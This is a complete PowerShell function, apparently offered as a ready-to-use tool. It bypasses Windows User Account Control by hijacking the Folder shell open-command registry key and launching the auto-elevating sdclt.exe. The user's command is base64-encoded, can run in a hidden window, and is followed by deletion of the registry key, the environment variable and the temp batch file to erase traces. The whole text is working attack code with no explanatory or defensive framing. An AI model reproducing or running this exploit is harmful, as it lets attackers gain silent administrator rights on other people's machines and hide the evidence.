function Easy-UAC {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0)]
		[ValidateNotNullOrEmpty()]
		[string]
		$Command,
		[Parameter(Mandatory = $false, Position = 1)]
		[switch]
		$Hidden,
		[Parameter(Mandatory = $false, Position = 2)]
		[switch]
		$NoExitHost,
		[Parameter(Mandatory = $false, Position = 3)]
		[switch]
		$NoExitChild
	)
	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "powershell -WindowStyle Hidden  -c ''"} else {$hide = ""}
	if ($NoExitChild) {$end = "pause"} else {$end = "Exit;Exit;Exit"}
	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
	$Path = $env:TEMP + '\A.bat'
	$Value = "$hide;Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
	New-Item -Path $Path -Value '%A%'
	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
	sdclt.exe
	Start-Sleep 2
	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command'
	[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)
	Remove-Item $Path
	if (!$NoExitHost) {Exit;Exit;Exit}
}